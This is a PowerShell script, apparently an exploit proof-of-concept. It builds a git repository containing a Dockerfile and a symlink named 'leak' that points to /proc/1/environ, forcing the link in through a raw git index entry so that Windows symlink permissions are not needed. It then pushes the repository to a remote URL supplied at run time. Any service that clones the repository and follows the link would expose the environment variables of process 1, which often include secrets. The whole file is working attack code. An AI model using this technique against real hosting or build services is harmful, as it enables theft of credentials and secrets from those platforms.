param(
  [Parameter(Mandatory = $true)]
  [string]$RemoteUrl
)

$ErrorActionPreference = "Stop"

function Exec([string]$cmd) {
  Write-Host ">> $cmd"
  & powershell -NoProfile -Command $cmd
  if ($LASTEXITCODE -ne 0) { throw "Command failed: $cmd" }
}

# Ensure we're running from this folder.
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $here

if (!(Get-Command git -ErrorAction SilentlyContinue)) {
  throw "git is required. Install Git for Windows first."
}

if (!(Test-Path ".git")) {
  Exec "git init"
  Exec "git checkout -b main"
}

Exec "git add README.md real.txt Dockerfile"

# Create a symlink entry in git without relying on Windows symlink permissions.
# This writes a blob whose content is the symlink target, then stages it with mode 120000.
$target = "/proc/1/environ"
$hash = ( $target | git hash-object -w --stdin ).Trim()
if (!$hash) { throw "Failed to create git blob for symlink target." }

Exec ("git update-index --add --cacheinfo 120000 {0} leak" -f $hash)

if (!(git remote | Select-String -SimpleMatch "origin" -Quiet)) {
  Exec ("git remote add origin {0}" -f $RemoteUrl)
}

Exec "git commit -m \"symlink test\""
Exec "git push -u origin main"

Write-Host ""
Write-Host "Pushed. Repo now contains a symlink named 'leak' -> $target"

